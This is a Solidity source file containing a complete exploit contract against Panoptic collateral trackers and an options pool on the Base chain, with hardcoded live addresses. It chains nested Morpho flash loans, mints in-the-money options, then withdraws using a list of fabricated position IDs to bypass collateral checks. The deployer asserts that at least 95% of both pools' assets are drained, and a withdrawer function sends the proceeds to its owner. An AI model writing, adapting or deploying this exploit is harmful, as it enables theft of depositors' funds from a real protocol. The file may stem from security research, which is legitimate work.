// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract ETH_USDC5bpsBaseAttacker_Deployer {
    ETH_USDC5bpsBaseAttacker public attacker;
    IWETH constant WETH = IWETH(0x4200000000000000000000000000000000000006);
    IERC20Partial token1 = IERC20Partial(address(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913)); // usdc
    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x636aEE6946Bbd338334504D01AA15B3Bc4AD8c19));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xAbbAD7A755BDF9bBeC357e2bDf4C02934a8D7A71));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new ETH_USDC5bpsBaseAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = WETH.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract ETH_USDC5bpsBaseAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [2987517637385779, 2860763139100488, 2945576882929199, 2908539669501161, 2987373795613225, 3053538158679207, 3061661400423662, 2996841706427482, 2950021403732379, 2971465427402187, 2895762766936173, 2933950360233902, 3006122390230295, 2919269261971725, 2980111604936854, 3056697756977193, 2941248357413772, 2866155163315097, 2985444958485543, 3018233713564055, 2829614215522921, 2872439749335316, 3005570792102652, 2911229061996019, 3088464036927527, 3092174478997877, 2931373662674841, 3037452056899374, 3009293222711442, 2982341629102467, 2858947436886441, 2856454500625135, 2958060422591441, 3074732465096534, 3022058824901014, 2885758018188420, 2982681386015420, 2860820526459620, 2931836940948541, 2864550401306692, 2944680247316728, 2917058059222912, 3046495305716021, 3036076053953690, 3041720254105294, 2942379481129740, 2872444133483922, 2845657889998567, 2939095957097039, 2818576507277439, 2814848980188857, 2880669254335400, 3007258691448060, 3086484725672432, 2968319873540837, 2858008670030339, 2830717524816566, 2907310086305333, 3020100323055231, 2862885087383043, 3065130994367298, 2868577491722252, 2868670060289348, 2989896871969840, 2892540275651255, 2997006386176469, 2821945863881345, 2947823697574552, 2956771556597423, 2994458761103336, 2918798512053830, 3021739367939089, 2904467949901416, 3057564107508459, 2871761490466205, 2887459923890852, 2874780289175524, 3019489553224295, 3008151132286128, 2913217869380008, 3079823621154834, 2816698442817551, 3015965569957952, 3013407447700698, 3067026375878999, 3092041553519256, 2921031089446003, 2903530705806459, 2946747537169835, 3061985238646613, 2824098653464220, 2871847337691746, 3062319134505869, 2973472988924751, 3053209896393576, 2850235977639581, 3008594640691662, 3003807612158152, 2831535768917142, 3068325448847037, 3032682272362739, 2885367314775480, 2942890090773765, 2894467762354723, 2880176580901716, 2876529125308938, 3074196714690827, 2870732479913576, 3001666821676634, 3086770062487243, 2903906783900097, 2989950919851845, 3000124441871715, 3091888367660759, 3001719631644348, 3064217530194918, 2824966720377254, 2903567951898222, 2894503671425322, 2896992914225694, 3015358180431945, 2848673403196020, 3843572006833231792737629634475558, 3843572006833231792737629634475558];

    // On base
    address token0 = address(0); // native eth
    IERC20Partial token1 = IERC20Partial(address(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913)); // usdc
    IMorpho morpho = IMorpho(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));

    // Need this for flash loaning:
    IWETH constant WETH = IWETH(0x4200000000000000000000000000000000000006);

    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x636aEE6946Bbd338334504D01AA15B3Bc4AD8c19));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xAbbAD7A755BDF9bBeC357e2bDf4C02934a8D7A71));
    IPanopticPool_v4 pp = IPanopticPool_v4(address(0x36a3088B94f73853a3964a0352B47605C6354f27));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            // passing in WETH, not token0, as the asset to borrow, as token0 is ETH which is not flash-loanable
            morpho.flashLoan(address(WETH), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            WETH.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        WETH.withdraw(attackAmount0);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit{value: attackAmount0}(uint128(attackAmount0), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283210638284349279242);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283210638284349279242);
        posIdList2[1] = TokenId.wrap(2560008631394908914116760996874);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList, false);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList, false);

        // Re-wrap the WETH to ultimately pay back the flash loan + keep profits in WETH, not ETH
        WETH.deposit{value: toWithdraw0}();

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
